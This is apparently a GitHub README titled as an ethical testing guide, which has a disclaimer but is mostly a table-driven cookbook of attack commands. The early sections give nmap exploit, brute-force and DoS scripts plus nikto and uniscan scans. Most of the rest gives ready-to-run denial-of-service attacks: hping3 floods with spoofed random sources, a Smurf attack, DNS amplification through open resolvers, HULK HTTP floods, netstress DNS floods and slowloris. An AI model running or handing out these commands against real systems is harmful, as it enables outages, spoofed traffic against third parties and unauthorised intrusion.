# This is an Ethical Testing Guide

The following Guid includes commands in the following:

* #### `nmap`

* #### `nikto`

* #### `uniscan`

* #### `hping3`


***
Author has submitted the code for educational purposes only. Author doesn't hold any responsibility for wrong usage of this intellectual property! 

```diff
-  NEVER PERFORM ETHICAL HACKING WITHOUT THE WRITTEN PERMISSION FROM THE PRODUCT OWNER, YOU HAVE BEEN WARNED!
```
***

## Nmap

Nmap is a security scanner, originally written by Gordon Lyon, used to discover hosts and services on a computer network, thus building a "map" of the network.


| Test Case | Command |
| :--- | :--- |
| Scan the target for vulnerabilities | `nmap -Pn --script vuln <target.com>` | 
| Actively exploit detected vulnerabilities | `nmap --script exploit -Pn <target.com` |
| Brute Force Passwords | `nmap --script brute -Pn <target.com>` |
| Test if target is vulnerable to DoS | `nmap --script dos -Pn <target.com>` |

## Nikto

Nikto Web Scanner is a Web server scanner that tests Web servers for dangerous files/CGIs, outdated server software and other problems. It performs generic and server type specific checks. It also captures and prints any cookies received

| Test Case | Command |
| :---  | :--- |
| SQL Injection | `nikto -Tuning 9 -h <target.com>` |
| DoS Check | `nikto -Tuning 6 -h <target.com>` |
| Perform check on suspicious files, misconfiguration leaks, etc. | `nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host <target.com>` |

## Uniscan

Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.

| Test Case | Command |
| :---  | :--- |
| Perform file checks | `uniscan -u <target.com> -w` |
| Perform `robots.txt` and `sitemap.xml` checks | `uniscan -u <target.com> -e` |
| Perform Dynamic Check | `uniscan -u <target.com> -d` |
| Perform Static Check | `uniscan -u <target.com> -s` |
| Perform Stress Check | `uniscan -u <target.com> -r` |

## Hping3 

*Additional reading prior to performing actions below is strongly recommended! You have been warned!

hping is a command-line oriented TCP/IP packet assembler/analyzer. The interface is inspired to the ping(8) unix command, but hping isn’t only able to send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols, has a traceroute mode, the ability to send files between a covered channel, and many other features.

| Test Case | Command |
| :--- | :---  | 
| Check whether a host is alive (when PING is blocked) - sends an RST response | `hping3 -c 2 -V -p 80 -s 5050 -a <target.com>` |
| Perform DoS attack | `hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE` |
| UDP flood | `hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP` |
| TCP FIN flood | `hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP` |
| TCP RST flood | `hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP` |
| PUSH and ACK floods | `hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP` |
| ICMP and IGMP floods | `hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP` |
| Smurf attack | `hping3 --icmp --spoof TARGET_IP BROADCAST_IP` |

***
```diff
- Additional studying and training is recommended below this point
```
***

## DNS Amplification

You need to have a recursive DNS server which has a karge file on the cache. You are supposed to use
<a href="https://www.infosec-ninjas.com/tsunami">Tsunami</a>

Example of the attack can be as follows:

`./tsunami -o recursive_dns.txt -1 4 -e 172.0.0.0/8`

Then it's possible to attack the target with using these DNS Servers as an amplifier:

`./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt`

Where <br/>
`-s` is the target IP address <br/>
`-n` optional doman name to probe <br/>
`-f` the open recursive DNS servers file for the attack <br/>
`-p` number of packets to be sent per DNS server <br/>

## HTTP Flood

HTTP flood is the most common attack that targeting application layer. It’s more difficult to detect than network layer attacks because requests seem to be legitimate. Since the 3-way handshake has already been completed, HTTP floods are fooling devices and solutions which are only examining layer 4.

You will need <a href="https://github.com/grafov/hulk/blob/master/hulk.py">HULK</a> for this:

`python hulk.py -site TARGET_SITE`

## DNS Flood

Domain Name System(DNS) is the protocol used to resolve domain names into IP addresses.

Like other flood attacks, the aim of DNS flood attacks is sending high-volume DNS requests to the DNS application protocol. The DNS server overwhelmed and unable to process all of the legitimate requests from other users.

You will need <a href="https://sourceforge.net/projects/netstressng/">netstress</a>:

`netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53`

Where: <br/>
`-d` is the destination address <br/>
`-a` is the type of attack <br/>
`-t` is the type of DNS query <br/>
`-n` is the number of processes <br/>
`-P` is the destination port

## Low and Slow Attacks

Unlike floods, low and slow attacks do not require a huge amount of data traffic. These types of attacks target application or server resources.

They are hard to detect because the traffic appears to occur at normal rates and legitimate.

My favorite tool is <a href="https://github.com/llaera/slowloris.pl">slowloris</a>:

| Steps | Command |
| :--- | :--- |
| Start an attack | `./slowloris.pl -dns TARGET_URL` |
| Change the port | `./slowloris.pl -dns TARGET_URL -port 80 -num 200` |
| Change Timeout value | `./slowloris.pl -dns TARGET_URL -port 80 -num 200 -timeout 30` |
| Attack an HTTPS website | `./slowloris.pl  -dns TARGET_URL -port 443 -timeout 30 -num 200 -https` |


```diff
+ You are encouraged to make pull requests and add more tools
``` 
